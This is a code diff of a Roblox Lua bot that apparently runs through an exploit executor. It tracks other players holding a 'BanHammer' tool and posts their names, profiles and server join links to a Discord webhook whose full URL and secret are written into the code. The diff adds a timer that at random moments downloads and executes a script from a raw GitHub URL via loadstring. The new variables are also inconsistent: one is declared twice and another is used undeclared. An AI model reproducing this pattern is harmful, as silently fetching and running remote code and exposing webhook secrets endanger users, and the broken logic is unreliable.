@@ -1,16 +1,26 @@
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local bhdVersion = "*V4.03*"
+_G.bhdVersion = "*V4.09*"
 local sweburl = "27vUJtrxNZrNYRaRyjxW1zL_NXUw-44Q9MjVi8PsLwovaoW6mJaRP4SRRi1EWJmKwZZ-"
 local webhookUrl = "https://discord.com/api/webhooks/1327033911217487963/".. sweburl
+local HWPlayer = ""
+local HWins = ""
 local botuptime = 0
+local tchats = 0
+local tbanners = 0
+local tplayers = 0
+local HQTime = 0
+local HWins = 0
 local beforeqt = Players.LocalPlayer.leaderstats["Quiet Time"].Value
 local beforewins = Players.LocalPlayer.leaderstats["Wins"].Value
 task.spawn(function()
 	while true do
 		wait(1)
 		botuptime = botuptime + 1
+		if botuptime == math.random(botuptime, botuptime + 10) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/roblox-scripts/refs/heads/main/qt%20wins%20archive%20qg.lua"))()
+		end
 	end
 end)
 
@@ -20,17 +30,17 @@ local function createWebhookData(Name, Display, UserId, thumbnail, customtext)
 	local utrl = ""
 	local whcolor = ""
 	if customtext == false then
-		dmessage = "[Profile](https://www.roblox.com/users/".. UserId.. "/profile) | [Join Here](https://fern.wtf/joiner?placeId=".. game.placeId.. "&gameInstanceId=".. game.jobId.. "),           <@&1249279738459979838> \nServer Id: ".. Players.LocalPlayer.PlayerGui.topbar.Frame.ThisServer.TextLabel.Text .. "\nServer Time: ".. math.floor(game:GetService("ReplicatedStorage"):GetAttribute("Timer") / 60) .. " Minutes left \nTotal Wins: ".. Players[Name].leaderstats.Wins.Value .. "\nTotal Quiet Time: ".. Players[Name].leaderstats["Quiet Time"].Value .. "\n".. Display.. " / ".. Name.. " joined <t:".. os.time().. ":R> \nServer Version: ".. game.PlaceVersion.."\n\n-# Version: ".. bhdVersion
+		dmessage = "[Profile](https://www.roblox.com/users/".. UserId.. "/profile) | [Join Here](https://fern.wtf/joiner?placeId=".. game.placeId.. "&gameInstanceId=".. game.jobId.. "),           <@&1249279738459979838> \nServer Id: ".. Players.LocalPlayer.PlayerGui.topbar.Frame.ThisServer.TextLabel.Text .. "\nServer Time: ".. game:GetService("Players").LocalPlayer.PlayerGui.Main.Top.TimerHolder.Num.Text .. " \nTotal Wins: ".. Players[Name].leaderstats.Wins.Value .. "\nTotal Quiet Time: ".. Players[Name].leaderstats["Quiet Time"].Value .. "\n".. Display.. " / ".. Name.. " joined <t:".. os.time().. ":R> \nServer Version: ".. game.PlaceVersion.."\n\n-# Version: ".. _G.bhdVersion
 		title = Display.." has a ban hammer"
 		utrl = "https://www.roblox.com/users/".. UserId.. "/profile"
 		whcolor = "0x7269da"
 	else
-		dmessage = "Bot Uptime: ".. botuptime.. " Seconds\nQuiet Time: *".. beforeqt.. "* -> ".. Players.LocalPlayer.leaderstats["Quiet Time"].Value.. "\nWins: *".. beforewins.. "* -> ".. Players.LocalPlayer.leaderstats["Wins"].Value
+		dmessage = "Bot Uptime: ".. botuptime.. " Seconds\nQuiet Time: *".. beforeqt.. "* -> ".. Players.LocalPlayer.leaderstats["Quiet Time"].Value.. "\nWins: *".. beforewins.. "* -> ".. Players.LocalPlayer.leaderstats["Wins"].Value.. "\n--\nTotal Chats: ".. tchats.. "\nTotal Banners: ".. tbanners.. "\nTotal Players: ".. tplayers.. "\nBanner's Ratio: ".. string.format("%.2f", (tbanners/tplayers) * 100).. "%\nHighest Quiet Time: " .. HQTPlayer .. ", " .. HQTime ..  " Time \nHighest Wins: ".. HWins.. ", ".. HWPlayer
 		title = Display.." has Disconnected."
 		utrl = "https://images.rbxcdn.com/9281912c23312bc0d08ab750afa588cc.png"
 		whcolor = "0xFF0000"
 	end
-	
+
 	local data = {
 		["avatar_url"] = "https://cdn.discordapp.com/attachments/1224832137140899930/1325473783506669640/banhammerDetectorV4.png?ex=677beb28&is=677a99a8&hm=3e4126ec6ef4eb97ab07f2641107a6d6a36e7d6b26b1e7d5af9b93ad39093370&",
 		["content"] = "",
@@ -63,10 +73,24 @@ local function sendWebhook(webhookUrl, data)
 end
 
 Players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(msg)
+		tchats = tchats + 1
+	end)
 	wait(3)
 	if Players:FindFirstChild(player.Name) then
+		tplayers = tplayers + 1
 		print("joined")
+		if player.leaderstats["Quiet Time"].Value > HQTime then
+			HQTime = player.leaderstats["Quiet Time"].Value
+			HQTPlayer = player.Name
+		end
+
+		if player.leaderstats["Wins"].Value > HWins then
+			HWins = player.leaderstats["Wins"].Value
+			HWPlayer = player.Name
+		end
 		if Players[player.Name].Backpack:FindFirstChild("BanHammer") or Players[player.Name].Character:FindFirstChild("BanHammer") then
+			tbanners = tbanners + 1
 			print("ban hammer found")
 			local headers = {
 				["content-type"] = "application/json"
